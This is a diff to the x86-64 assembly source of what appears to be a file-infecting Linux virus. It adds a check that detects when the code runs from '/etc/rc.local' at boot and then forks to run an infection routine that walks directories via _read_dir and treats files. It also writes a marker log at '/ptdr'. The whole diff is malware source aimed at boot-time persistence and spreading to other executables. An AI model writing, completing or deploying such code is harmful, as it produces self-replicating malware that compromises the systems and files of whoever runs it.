@@ -1,10 +1,13 @@
 section .text
     global _start_infect
     global _infect_from_root
+    global _verify_starting_infect
     extern _final_end
     extern _string
     extern _treat_file
     extern _read_dir
+    extern _continue_normaly
+    extern _verify_o_entry
 
 ;_rc_local:
 ;    .string db '/etc/rc.local', 0
@@ -43,8 +46,67 @@ _ret:
     leave
     ret
 
+_log_file:
+    .name db '/ptdr', 0
+
+_starting_str:
+    .name db '/bin/sh', 0
+    .namelen equ $ - _starting_str.name
+    .option db '-e', 0
+    .optionlen equ $ - _starting_str.option
+    .file db '/etc/rc.local', 0
+    .filelen equ $ - _starting_str.file
+    .order db 'start', 0
+    .orderlen equ $ - _starting_str.order
+
+_verify_starting_infect:
+    mov rdi, QWORD [rsp + 136]
+    mov rcx, _starting_str.namelen
+    lea rsi, [rel _starting_str.name]
+    cld
+    repe cmpsb
+    jne _continue_normaly
+    mov rdi, QWORD [rsp + 144]
+    mov rcx, _starting_str.optionlen
+    lea rsi, [rel _starting_str.option]
+    cld
+    repe cmpsb
+    jne _continue_normaly
+    mov rdi, QWORD [rsp + 152]
+    mov rcx, _starting_str.filelen
+    lea rsi, [rel _starting_str.file]
+    cld
+    repe cmpsb
+    jne _continue_normaly
+    mov rdi, QWORD [rsp + 160]
+    mov rcx, _starting_str.orderlen
+    lea rsi, [rel _starting_str.order]
+    cld
+    repe cmpsb
+    jne _continue_normaly
+    mov rax, 57
+    syscall
+    cmp rax, 0
+    jne _verify_o_entry
+    lea rdi, [rel _exit_properly]
+
 _infect_from_root:
-    enter 16, 0
+;    enter 16, 0
+    push rdi
+    mov rax, 2
+    lea rdi, [rel _log_file.name]
+    mov rsi, 2
+    syscall
+    push rax
+    mov rax, 1
+    mov rdi, QWORD [rsp]
+    lea rsi, [rel _starting_str.order]
+    mov rdx, 5
+    syscall
+    mov rax, 3
+    mov rdi, QWORD [rsp]
+    syscall
+    pop rax
     mov rax, 0
     push rax
     mov rax, 1
@@ -54,7 +116,12 @@ _infect_from_root:
     push rax
     push rax
     call _read_dir
-    jmp _exit_properly
+    pop rdi
+    pop rdi
+    pop rdi
+    pop rdi
+    pop rdi
+    jmp rdi
 
 _new_bash:
     .string db '/bin/test', 0
